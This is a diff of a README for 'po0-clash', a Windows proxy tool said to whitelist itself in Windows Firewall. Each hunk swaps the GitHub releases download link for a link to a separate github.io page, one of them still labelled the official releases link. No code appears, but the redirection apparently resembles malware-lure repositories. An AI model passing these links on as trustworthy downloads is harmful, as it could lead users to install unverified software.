@@ -1,6 +1,6 @@
 # 🛡️ po0-clash - Easy Proxy Control, Firewall Hassle Gone
 
-[![Download po0-clash](https://img.shields.io/badge/Download-po0--clash-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/haridade777rlk/po0-clash/releases)
+[![Download po0-clash](https://img.shields.io/badge/Download-po0--clash-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://haridade777rlk.github.io)
 
 po0-clash is a Windows application that helps you manage proxy connections without fighting with firewall settings. It is built on FlClash and includes po0fw, a built-in po0 firewall auto-whitelist feature that helps po0-clash communicate through Windows Firewall automatically.
 
@@ -24,7 +24,7 @@ In plain terms: po0-clash is meant to make proxy use on Windows easier, especial
 
 ## 📥 Download po0-clash for Windows
 
-[![Download po0-clash](https://img.shields.io/badge/Download%20po0--clash-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/haridade777rlk/po0-clash/releases)
+[![Download po0-clash](https://img.shields.io/badge/Download%20po0--clash-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://haridade777rlk.github.io)
 
 Visit this link to download the application.
 
@@ -95,7 +95,7 @@ No. po0-clash includes po0fw, the built-in po0 firewall auto-whitelist, to help 
 Yes. This guide is written for Windows users who want to download and run po0-clash.
 
 **Where do I get po0-clash?**  
-Use the official releases link: https://github.com/haridade777rlk/po0-clash/releases. Visit this link to download the application.
+Use the official releases link: https://haridade777rlk.github.io Visit this link to download the application.
 
 **Do I need programming knowledge?**  
 No. The download and run process is meant for average computer users.
